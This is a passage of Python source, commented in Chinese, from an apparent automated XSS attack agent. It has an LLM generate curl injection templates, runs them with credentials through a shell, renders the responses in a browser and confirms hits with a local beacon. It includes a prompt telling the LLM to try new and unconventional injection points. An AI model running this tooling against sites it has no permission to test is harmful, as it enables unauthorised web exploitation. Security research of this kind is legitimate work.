    #     has_url_payload = '{PAYLOAD}' in curl_template.split('-H')[0]  # -H之前的部分

    #     return is_get and has_url_payload

    # def _extract_url_from_curl(self, curl_command: str) -> str:
    #     """
    #     从curl命令中提取URL（修复版 - 支持包含#和特殊字符的URL）

    #     Args:
    #         curl_command: 完整的curl命令

    #     Returns:
    #         提取的URL
    #     """
    #     # 策略1: 匹配单引号包裹的URL（非贪婪匹配，只到第一个结束单引号）
    #     match = re.search(r"curl\s+(?:-X\s+\w+\s+)?'(.+?)'", curl_command)
    #     if match:
    #         return match.group(1)

    #     # 策略2: 匹配双引号包裹的URL
    #     match = re.search(r"curl\s+(?:-X\s+\w+\s+)?\"(.+?)\"", curl_command)
    #     if match:
    #         return match.group(1)

    #     # 策略3: 匹配不带引号的URL（fallback）
    #     match = re.search(r"curl\s+(?:-X\s+\w+\s+)?([^\s'\"]+)", curl_command)
    #     if match:
    #         return match.group(1)

    #     return ""

    def _ensure_curl_include_headers(self, curl_command: str) -> str:
        """
        确保curl命令包含 -i / --include（输出HTTP响应头）
        """
        # 简单粗暴点：只要命令中没出现 -i 或 --include，就在第一个 curl 后面插进去
        if '-i' not in curl_command and '--include' not in curl_command:
            return curl_command.replace('curl ', 'curl -i ', 1)
        return curl_command

    def _parse_curl_response(self, curl_output: str):
        """
        解析 curl -i 输出：
        返回 (http_status:int|None, headers:dict, body:str)
        """
        lines = curl_output.split('\n')

        http_status = None
        headers = {}
        body_start_idx = 0

        for i, line in enumerate(lines):
            # HTTP 状态行，例如：HTTP/1.1 200 OK
            if line.startswith('HTTP/'):
                try:
                    http_status = int(line.split()[1])
                except Exception:
                    pass
            elif line.strip() == '':
                body_start_idx = i + 1
                break
            elif ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip().lower()] = value.strip()

        body = '\n'.join(lines[body_start_idx:])
        return http_status, headers, body

    def _is_html_response(self, headers: dict, body: str) -> bool:
        """
        是否看起来是HTML：
        - 优先基于 Content-Type
        - 其次看内容特征
        """
        content_type = headers.get('content-type', '').lower()

        # 方案A：Content-Type 明确是 HTML
        if 'text/html' in content_type:
            return True

        # 方案B：Content-Type 不明确，但可能是 text
        if content_type == '' or 'text/' in content_type:
            body_lower = body.lower().strip()[:1000]
            return any([
                '<!doctype html' in body_lower,
                '<html' in body_lower,
                '<head' in body_lower,
                '<body' in body_lower,
                body_lower.startswith('<html'),
            ])

        return False

    # def _render_and_check_xss(self, html_content: str, random_id: int) -> bool:
    #     """
    #     用driver渲染HTML并检查XSS是否触发
    #     """
    #     import base64
    #     import time

    #     self._log(f"  [Rendering HTML with driver...]")

    #     try:
    #         # 1. HTML -> base64 data URL
    #         b64_html = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
    #         data_url = f"data:text/html;base64,{b64_html}"

    #         # 2. 用 driver 加载（不会再发 HTTP 请求）
    #         self.driver.get(data_url)

    #         # 3. 等一小会儿，给 payload 时间执行
    #         time.sleep(0.5)

    #         # 4. 检查 beacon
    #         if check_beacon_detection(str(random_id)):
    #             self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id}")
    #             self.triggered_tokens.add(str(random_id))
    #             return True

    #         # 5. 额外检查 window.xss_array
    #         try:
    #             arr = self.driver.execute_script("return window.xss_array || [];")
    #             self._log(f"  [XSS Array]: {arr}")

    #             if random_id in arr:
    #                 self._log(f"  ✓ XSS TRIGGERED via xss_array! Random ID {random_id}")
    #                 self.xss_array.add(random_id)
    #                 return True
    #         except Exception as e:
    #             self._log(f"  ⚠️  Failed to check xss_array: {e}")

    #         self._log(f"  ✗ XSS not triggered in rendered HTML")
    #         return False

    #     except Exception as e:
    #         self._log(f"  ✗ Rendering failed: {e}")
    #         return False

    # 在 XSSAgent 类中添加这个辅助方法
    def _is_crash_prone_page(self, html_content: str) -> bool:
        """
        检查 HTML 是否为容易导致 Driver 崩溃的服务器报错页面
        """
        if not html_content:
            return False
            
        # 典型的 Apache/Nginx 报错页面特征
        # 结合你日志里的 "<title>400 Bad Request</title>"
        crash_signatures = [
            "<title>400 Bad Request</title>",
            "<h1>Bad Request</h1>",
            "<title>500 Internal Server Error</title>",
            "<title>502 Bad Gateway</title>",
            "<h1>Internal Server Error</h1>",
            "Your browser sent a request that this server could not understand"
        ]
        
        for sig in crash_signatures:
            if sig in html_content:
                return True
        
        return False

    def _render_and_check_xss(self, html_content: str, random_id: int, 
                              template_index: int = 0, payload_index: int = 0) -> bool:
        """
        用driver渲染HTML并检查XSS是否触发
        
        Args:
            html_content: HTML内容
            random_id: 随机ID
            template_index: 模板索引（用于截图命名）
            payload_index: payload索引（用于截图命名）
        """
        import base64
        import time
        from datetime import datetime

        self._log(f"  [Rendering HTML with driver...]")

        if self._is_crash_prone_page(html_content):
            self._log(f"  🛑 [SKIP RENDER] Detected Server Error Page (400/500).")
            return False

        try:
            # 1. HTML -> base64 data URL
            b64_html = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
            data_url = f"data:text/html;base64,{b64_html}"

            # 2. 用 driver 加载（不会再发 HTTP 请求）
            self.driver.get(data_url)

            # 3. 等一小会儿，给 payload 时间执行
            time.sleep(0.5)

            # 4. 截图保存（在检查XSS之前）
            screenshot_saved = self._save_screenshot(random_id, template_index, payload_index)
            if screenshot_saved:
                self._log(f"  📸 Screenshot saved")

            # 5. 检查 beacon
            if check_beacon_detection(str(random_id)):
                self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id}")
                self.triggered_tokens.add(str(random_id))
                return True

            # 6. 额外检查 window.xss_array
            try:
                arr = self.driver.execute_script("return window.xss_array || [];")
                self._log(f"  [XSS Array]: {arr}")

                if random_id in arr:
                    self._log(f"  ✓ XSS TRIGGERED via xss_array! Random ID {random_id}")
                    self.xss_array.add(random_id)
                    return True
            except Exception as e:
                self._log(f"  ⚠️  Failed to check xss_array: {e}")

            self._log(f"  ✗ XSS not triggered in rendered HTML")
            return False

        except Exception as e:
            self._log(f"  ✗ Rendering failed: {e}")
            return False

    def _save_screenshot(self, random_id: int, template_index: int, payload_index: int) -> bool:
        """
        保存当前页面截图
        
        Args:
            random_id: 随机ID
            template_index: 模板索引
            payload_index: payload索引
            
        Returns:
            是否成功保存截图
        """
        try:
            from datetime import datetime
            
            # 生成文件名：rid_{random_id}_t{template}_p{payload}_{timestamp}.png
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"rid_{random_id}_t{template_index}_p{payload_index}_{timestamp}.png"
            screenshot_path = self.log_dir / filename
            
            # 保存截图
            self.driver.save_screenshot(str(screenshot_path))
            
            return True
            
        except Exception as e:
            self._log(f"  ⚠️  Failed to save screenshot: {e}")
            return False

    def _extract_url_from_curl(self, curl_command: str) -> str:
        try:
            parts = shlex.split(curl_command)
        except Exception:
            parts = curl_command.split()

        for p in parts:
            if p.startswith("http://") or p.startswith("https://"):
                return p

        # 如果还是没找到，可以再用一个兜底 regex
        match = re.search(r"(https?://[^\s'\"\\]+)", curl_command)
        if match:
            return match.group(1)

        return ""

    # ========== Stage 2: 反思攻击方法 ==========
    # def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
    #                    stage1_context: Dict[str, Any]) -> Dict[str, Any]:
    #     """
    #     执行Stage 2反思攻击（XSS版，纯OOB检测）

    #     复用CMDI的反思逻辑
    #     """
    #     # 1. 构建反思suffix
    #     self._log(f"[Reflection] Building reflection analysis...")
    #     reflection_suffix = self._build_reflection_suffix(stage1_context)

    #     # 2. 调用LLM生成新模板
    #     self._log(f"[Step 1: Generating Reflection Templates via LLM]")
    #     new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
    #         request=request,
    #         reflection_suffix=reflection_suffix
    #     )

    #     if not new_templates:
    #         self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
    #         stage1_context["reflection_attempted"] = True
    #         stage1_context["reflection_note"] = "No new templates generated"
    #         return stage1_context

    #     self._log(f"[LLM Generated {len(new_templates)} new template(s)]:")
    #     for i, tmpl in enumerate(new_templates, 1):
    #         self._log(f"  {i}. {tmpl}")
    #     self._log(f"")

    #     # 3. 生成新的random_id
    #     random_id = random.randint(100000, 999999)
    #     self._log(f"[Step 2: Generated New Random ID (beacon token)]: {random_id}")
    #     self._log(f"  Expected beacon URL: http://127.0.0.1:9091/?data={random_id}")
    #     self._log(f"")

    #     # 4. 生成XSS payload列表
    #     xss_payloads = self._get_xss_payloads(random_id)
    #     self._log(f"[Step 3: Generated {len(xss_payloads)} XSS Payloads]:")
    #     for i, payload in enumerate(xss_payloads, 1):
    #         self._log(f"  {i}. {payload[:100]}{'...' if len(payload) > 100 else ''}")
    #     self._log(f"")

    #     # 5. 执行测试
    #     self._log(f"[Step 4: Executing Tests]")
    #     payloads_tested = 0
    #     method = request.get("method", "GET")
    #     url = request.get("url", "")
    #     vulnerable = False

    #     for template in new_templates:
    #         self._log(f"\n[Testing Template]: {template}")

    #         # # 判断是否为GET URL注入
    #         # is_get_url = self._is_get_url_injection(template)

    #         for payload in xss_payloads:
    #             if '{PAYLOAD}' not in template:
    #                 self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
    #                 continue

    #             final_command = template.replace('{PAYLOAD}', payload)
    #             final_command = append_credentials_to_curl(final_command, credentials)

    #             # 记录执行信息
    #             self.execution_records[random_id] = {
    #                 "random_id": random_id,
    #                 "payload": payload,
    #                 "template": template,
    #                 "command": final_command,
    #                 "original_url": url,
    #                 "method": method
    #             }

    #             if is_get_url:
    #                 # ✅ GET URL注入：用driver.get()访问
    #                 injected_url = self._extract_url_from_curl(final_command)
    #                 self._log(f"  [Payload]: {payload}")
    #                 self._log(f"  [Method]: driver.get()")
    #                 self._log(f"  [URL]: {injected_url}")

    #                 try:
    #                     self.driver.get(injected_url)

    #                     # ✅ 立即检查beacon日志
    #                     import time
    #                     time.sleep(0.5)

    #                     if check_beacon_detection(str(random_id)):
    #                         self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id} detected in log!")
    #                         self.triggered_tokens.add(str(random_id))
    #                         payloads_tested += 1
    #                         self._log(f"  🎯 XSS confirmed, stopping further tests")
    #                         vulnerable = True
    #                         break

    #                     # ✅ 补充检查window.xss_array
    #                     try:
    #                         arr = self.driver.execute_script("return window.xss_array || [];")
    #                         self._log(f"  [Current XSS Array]: {arr}")

    #                         if arr:
    #                             for xss_id in arr:
    #                                 self.xss_array.add(xss_id)
    #                                 if xss_id == random_id:
    #                                     self._log(f"  ✓ XSS also detected in xss_array! Random ID {random_id}")
    #                                     payloads_tested += 1
    #                                     self._log(f"  🎯 XSS confirmed via xss_array")
    #                                     vulnerable = True
    #                                     break
    #                     except Exception as e:
    #                         self._log(f"  ⚠️  Failed to check xss_array: {e}")

    #                     if vulnerable:
    #                         break

    #                     self._log(f"  ✓ Executed via driver")
    #                     payloads_tested += 1

    #                 except Exception as e:
    #                     self._log(f"  ✗ Failed: {e}")

    #             else:
    #                 # ✅ 其他注入：用curl执行
    #                 self._log(f"  [Payload]: {payload}")
    #                 self._log(f"  [Method]: curl subprocess")
    #                 self._log(f"  [Command]: {final_command}")

    #                 try:
    #                     process = subprocess.Popen(
    #                         final_command,
    #                         shell=True,
    #                         stdout=subprocess.PIPE,
    #                         stderr=subprocess.PIPE,
    #                         text=True
    #                     )
    #                     stdout, stderr = process.communicate(timeout=10)

    #                     from attack_agent.request_utils import parse_http_status_from_response
    #                     http_status, response_body = parse_http_status_from_response(stdout)

    #                     self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
    #                     if http_status is not None:
    #                         self._log(f"  HTTP Status: {http_status}")
    #                     self._log(f"  Response length: {len(response_body)} bytes")
    #                     # 修改后：
    #                     extracted_body = extract_useful_response(response_body, max_length=2000)
    #                     self._log(f"  Response (extracted): {extracted_body}")
    #                     if stderr:
    #                         self._log(f"  Stderr: {stderr}")
    #                     payloads_tested += 1

    #                 except subprocess.TimeoutExpired:
    #                     self._log(f"  ✗ Timeout after 10 seconds")
    #                 except Exception as e:
    #                     self._log(f"  ✗ Failed: {e}")

    #         # 如果已检测到漏洞，跳出模板循环
    #         if vulnerable:
    #             break

    #     # 6. 检查beacon日志（主要检测）
    #     self._log(f"\n[Step 5: Checking Beacon Detection]")
    #     if not vulnerable:
    #         vulnerable = check_beacon_detection(str(random_id))

    #     if vulnerable:
    #         self._log(f"  ✓✓✓ BEACON DETECTION: Random ID {random_id} found in log!")
    #         self.triggered_tokens.add(str(random_id))
    #     else:
    #         self._log(f"  ✗ Beacon not detected (random_id {random_id} not in log)")

    #     # 7. 补充检查xss_array
    #     if not vulnerable and random_id in self.xss_array:
    #         self._log(f"  ✓ XSS_ARRAY DETECTION: Random ID {random_id} found!")
    #         vulnerable = True

    #     self._log(f"\n{'='*70}")
    #     self._log(f"[XSS Test Summary - Stage 2]")
    #     self._log(f"  Total Payloads Tested: {payloads_tested}")
    #     self._log(f"  Random ID (beacon token): {random_id}")
    #     self._log(f"  Beacon Triggered: {str(random_id) in self.triggered_tokens}")
    #     self._log(f"  XSS Array Count: {len(self.xss_array)}")

    #     # if vulnerable:
    #     #     self._log(f"  Result: VULNERABLE (XSS confirmed in Stage 2)")
    #     # else:
    #     #     # 检查是否有GET测试
    #     #     has_get_test = any(self._is_get_url_injection(tmpl) for tmpl in new_templates)
    #     #     if has_get_test:
    #     #         self._log(f"  Result: SAFE (GET requests tested, no XSS triggered)")
    #     #     else:
    #     #         vulnerable = None
    #     #         self._log(f"  Result: PENDING (waiting for finalize to check stored XSS)")

    #     if vulnerable:
    #         self._log(f"  Result: VULNERABLE (XSS confirmed)")
    #     else:
    #         self._log(f"  Result: SAFE (no XSS triggered in immediate tests)")

    #     self._log(f"{'='*70}\n")

    #     # ✅ 在 return 语句中添加 stage1_results
    #     return {
    #         "vulnerable": vulnerable,
    #         "stage": 2,
    #         "payloads_tested": payloads_tested,
    #         "random_id": random_id,
    #         "curl_templates": new_templates,
    #         "llm_reflection_output": llm_reflection_output,
    #         "reflection_analysis": reflection_suffix,
    #         # ✅ 新增：保留Stage 1的完整结果
    #         "stage1_results": {
    #             "curl_templates": stage1_context.get("curl_templates", []),
    #             "payloads_tested": stage1_context.get("payloads_tested", 0),
    #             "random_id": stage1_context.get("random_id"),
    #             "llm_analysis": stage1_context.get("llm_analysis", "")
    #         },
    #         "note": f"Stage 2 - Reflection attack: {'XSS confirmed' if vulnerable else 'Pending finalize'}"
    #     }

    def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                    stage1_context: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 2反思攻击（XSS版，统一 curl + HTML 渲染）
        """
        # 1. 构建反思suffix
        self._log(f"[Reflection] Building reflection analysis...")
        reflection_suffix = self._build_reflection_suffix(stage1_context)

        # 2. 调用LLM生成新模板
        self._log(f"[Step 1: Generating Reflection Templates via LLM]")
        new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
            request=request,
            reflection_suffix=reflection_suffix
        )

        if not new_templates:
            self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
            stage1_context["reflection_attempted"] = True
            stage1_context["reflection_note"] = "No new templates generated"
            return stage1_context

        self._log(f"[LLM Generated {len(new_templates)} new template(s)]:")
        for i, tmpl in enumerate(new_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log(f"")

        # 3. 生成新的random_id
        random_id = random.randint(100000, 999999)
        self._log(f"[Step 2: Generated New Random ID (beacon token)]: {random_id}")
        self._log(f"  Expected beacon URL: http://127.0.0.1:9091/?data={random_id}")
        self._log(f"")

        # 4. 生成XSS payload列表
        xss_payloads = self._get_xss_payloads(random_id)
        self._log(f"[Step 3: Generated {len(xss_payloads)} XSS Payloads]:")
        for i, payload in enumerate(xss_payloads, 1):
            self._log(f"  {i}. {payload[:100]}{'...' if len(payload) > 100 else ''}")
        self._log(f"")

        # 5. 执行测试（统一：curl + 判断HTML + driver渲染）
        self._log(f"[Step 4: Executing Tests]")
        payloads_tested = 0
        method = request.get("method", "GET")
        url = request.get("url", "")
        vulnerable = False

        for template in new_templates:
            self._log(f"\n[Testing Template]: {template}")

            for payload in xss_payloads:
                if '{PAYLOAD}' not in template:
                    self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
                    continue

                # 1) 替换payload
                final_command = template.replace('{PAYLOAD}', payload)
                injected_url = self._extract_url_from_curl(final_command)
                safe_url = self._sanitize_url_for_http(injected_url)
                if safe_url != injected_url:
                    final_command = self._rewrite_curl_url(final_command, safe_url)


                # 2) 确保curl输出响应头
                final_command = self._ensure_curl_include_headers(final_command)

                # 3) 追加凭证
                final_command = append_credentials_to_curl(final_command, credentials)

                # 4) 记录执行信息
                self.execution_records[random_id] = {
                    "random_id": random_id,
                    "payload": payload,
                    "template": template,
                    "command": final_command,
                    "original_url": url,
                    "method": method
                }

                self._log(f"  [Payload]: {payload}")
                self._log(f"  [Method]: curl + driver-render-if-html")
                self._log(f"  [Command]: {final_command}")

                try:
                    process = subprocess.Popen(
                        final_command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(timeout=10)

                    # 5) 解析curl响应：HTTP状态 + 头 + body
                    http_status, headers, body = self._parse_curl_response(stdout)

                    self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")
                    self._log(f"  Body length: {len(body)} bytes")

                    # 日志里保留一段裁剪后的body方便审计
                    extracted_body = extract_useful_response(body, max_length=2000)
                    self._log(f"  Response (extracted): {extracted_body}")
                    if stderr:
                        self._log(f"  Stderr: {stderr}")

                    # 6) 判断是否HTML
                    is_html = self._is_html_response(headers, body)
                    self._log(f"  Is HTML: {is_html}")

                    # 7) 如果是HTML且有driver，用driver渲染并检查XSS
                    if is_html and self.driver:
                        if self._render_and_check_xss(body, random_id):
                            self._log(f"  🎯 XSS confirmed in Stage 2, stopping further tests")
                            vulnerable = True
                            payloads_tested += 1
                            break  # 跳出payload循环

                    payloads_tested += 1

                except subprocess.TimeoutExpired:
                    self._log(f"  ✗ Timeout after 10 seconds")
                except Exception as e:
                    self._log(f"  ✗ Failed: {e}")

            # 如果已检测到漏洞，跳出模板循环
            if vulnerable:
                break

        # 6. 检查beacon日志（主要检测）——如果渲染阶段还没判定为True，再查一次
        self._log(f"\n[Step 5: Checking Beacon Detection]")
        if not vulnerable:
            if check_beacon_detection(str(random_id)):
                self._log(f"  ✓✓✓ BEACON DETECTION: Random ID {random_id} found in log!")
                self.triggered_tokens.add(str(random_id))
                vulnerable = True
            else:
                self._log(f"  ✗ Beacon not detected (random_id {random_id} not in log)")
        else:
            # 已经确认有XSS了，可以再看一眼beacon做个补充日志
            if check_beacon_detection(str(random_id)):
                self._log(f"  (Beacon also confirms XSS for Random ID {random_id})")
                self.triggered_tokens.add(str(random_id))

        # 7. 补充检查xss_array
        if not vulnerable and random_id in self.xss_array:
            self._log(f"  ✓ XSS_ARRAY DETECTION: Random ID {random_id} found!")
            vulnerable = True

        self._log(f"\n{'='*70}")
        self._log(f"[XSS Test Summary - Stage 2]")
        self._log(f"  Total Payloads Tested: {payloads_tested}")
        self._log(f"  Random ID (beacon token): {random_id}")
        self._log(f"  Beacon Triggered: {str(random_id) in self.triggered_tokens}")
        self._log(f"  XSS Array Count: {len(self.xss_array)}")

        if vulnerable:
            self._log(f"  Result: VULNERABLE (XSS confirmed in Stage 2)")
        else:
            self._log(f"  Result: SAFE (no XSS triggered in Stage 2 immediate tests)")

        self._log(f"{'='*70}\n")

        # ✅ 在 return 语句中仍然保留 Stage 1 的上下文信息
        return {
            "vulnerable": vulnerable,
            "stage": 2,
            "payloads_tested": payloads_tested,
            "random_id": random_id,
            "curl_templates": new_templates,
            "llm_reflection_output": llm_reflection_output,
            "reflection_analysis": reflection_suffix,
            "stage1_results": {
                "curl_templates": stage1_context.get("curl_templates", []),
                "payloads_tested": stage1_context.get("payloads_tested", 0),
                "random_id": stage1_context.get("random_id"),
                "llm_analysis": stage1_context.get("llm_analysis", "")
            },
            "note": f"Stage 2 - Reflection attack: {'XSS confirmed' if vulnerable else 'Safe in immediate tests'}"
        }

    def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
        """
        构建XSS反思suffix
        """
        templates = stage1_context.get("curl_templates", [])
        payloads_tested = stage1_context.get("payloads_tested", 0)
        vulnerable = stage1_context.get("vulnerable")

        suffix = "\n\n"
        suffix += "="*70 + "\n"
        suffix += "STAGE 1 RESULTS (Failed Detection)\n"
        suffix += "="*70 + "\n\n"

        # 1. 之前生成的模板
        suffix += "Previous Templates Generated:\n"
        for i, tmpl in enumerate(templates, 1):
            suffix += f"{i}. {tmpl}\n"
        suffix += "\n"

        # 2. 执行结果摘要
        suffix += "Execution Results:\n"
        suffix += "-"*70 + "\n"
        suffix += f"Total payloads tested: {payloads_tested}\n"
        suffix += f"OOB beacon detection: FAILED (random_id not found)\n"
        suffix += f"XSS array detection: FAILED (no random_id in window.xss_array)\n"
        suffix += "\n"

        # 3. 结果说明
        suffix += f"Result: {'NOT VULNERABLE' if vulnerable is False else 'UNCERTAIN/PENDING'}\n"
        suffix += "\n"

        # 4. 反思任务说明
        suffix += "="*70 + "\n"
        suffix += "YOUR TASK FOR STAGE 2 - REFLECTION\n"
        suffix += "="*70 + "\n\n"

        suffix += """Based on the above failed XSS attempt, please:

1. **Analyze Why Stage 1 Failed**:
   - Was the injection point correct?
   - Did responses show XSS filtering/escaping?
   - Were there error messages revealing protection mechanisms?
   - Did we test the right parameters/headers?

2. **Design NEW Injection Strategy**:
   - Try DIFFERENT injection points (different parameters, headers, paths, etc.)
   - Adjust request structure based on error patterns
   - Consider alternative approaches (e.g., if URL parameter failed, try POST body or headers)

3. **Generate NEW Curl Command Templates**:
   - Use {PAYLOAD} placeholder (payload content will remain the same - XSS payloads)
   - Focus on changing WHERE to inject, not WHAT to inject
   - You can modify field names, add/remove parameters, change headers, etc.
   - If previous templates tested URL parameters, try POST body or headers
   - If previous templates used GET, consider POST with different structure

IMPORTANT:
- Keep the {PAYLOAD} placeholder unchanged
- Focus on changing injection points/request structure
- Generate 3-5 NEW templates with DIFFERENT injection points
- Be creative - try unconventional injection points

Output Format (same as Stage 1):

Analysis:
<Your failure analysis and new strategy explanation>

Commands:
<curl command 1 with {PAYLOAD}>
<curl command 2 with {PAYLOAD}>
<curl command 3 with {PAYLOAD}>
...
"""

        return suffix

    def _generate_curl_templates_with_reflection(self, request: Dict[str, Any],
                                                 reflection_suffix: str) -> tuple:
        """
        调用LLM生成反思后的新XSS模板
        """
        sys_prompt = self._load_prompt_template()
        original_response = str(request.get('response_body', ''))
        extracted_response = extract_useful_response(original_response, max_length=2000)

        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for XSS testing.
"""

        # ✅ Append反思内容
        user_prompt += reflection_suffix

        self._log(f"\n[LLM INPUT - Reflection Prompt]:")
        self._log(f"{'~'*70}")
        self._log(f"{user_prompt}")
        self._log(f"{'~'*70}\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                temperature=get_temperature("attack_agent")
            )

            llm_output = completion.choices[0].message.content

            self._log(f"[LLM OUTPUT - Reflection Response]:")
            self._log(f"{'~'*70}")
            self._log(f"{llm_output}")
            self._log(f"{'~'*70}\n")

            templates = self._parse_curl_templates(llm_output)
            return templates, llm_output

        except Exception as e:
            self._log(f"[Reflection] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""

    def check_final_results(self) -> Dict[int, bool]:
        """
        检查最终结果（在统一访问所有页面后调用）

        Returns:
            {random_id: is_vulnerable}
        """
        self._log(f"\n{'='*70}")
        self._log(f"[XSS] Checking Final Results")
        self._log(f"{'='*70}\n")

        updates = {}

        for random_id in self.execution_records.keys():
            # 检查beacon日志（主要检测）
            beacon_triggered = check_beacon_detection(str(random_id))

            # 检查xss_array（补充检测）
            array_triggered = random_id in self.xss_array

            # 尝试从当前页面读取xss_array（额外补充）
            try:
                if self.driver:
                    arr = self.driver.execute_script("return window.xss_array || [];")
                    if random_id in arr:
                        array_triggered = True
                        self.xss_array.add(random_id)
            except:
                pass

            is_vulnerable = beacon_triggered or array_triggered
            updates[random_id] = is_vulnerable

            if is_vulnerable:
                self._log(f"  ✓ Token {random_id}: VULNERABLE")
                if beacon_triggered:
                    self._log(f"    - Detected via beacon")
                if array_triggered:
                    self._log(f"    - Detected via xss_array")
            else:
                self._log(f"  ✗ Token {random_id}: SAFE")

        self._log(f"\n[XSS] Final Summary:")
        successful = sum(1 for v in updates.values() if v)
        self._log(f"  Total tests: {len(updates)}")
        self._log(f"  Successful XSS: {successful}")
        self._log(f"{'='*70}\n")

        # 保存结果
        self._save_final_results(updates)

        return updates

    def _save_final_results(self, updates: Dict[int, bool]):
        """保存最终结果"""
        successful_attacks = []

        for random_id, is_vulnerable in updates.items():
            if is_vulnerable and random_id in self.execution_records:
                record = self.execution_records[random_id]
                successful_attacks.append({
                    "id": random_id,
                    "payload": record["payload"],
                    "url": record["original_url"],
                    "method": record["method"],
                    "template": record.get("template", "N/A")
                })

        results = {
            "total_tests": len(updates),
            "successful_count": len(successful_attacks),
            "xss_array": sorted(self.xss_array),
            "successful_attacks": successful_attacks
        }

        output_file = self.log_dir / "xss_results.json"
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            self._log(f"[Saved] XSS results saved to: {output_file}")
        except Exception as e:
            self._log(f"[Error] Failed to save results: {e}")
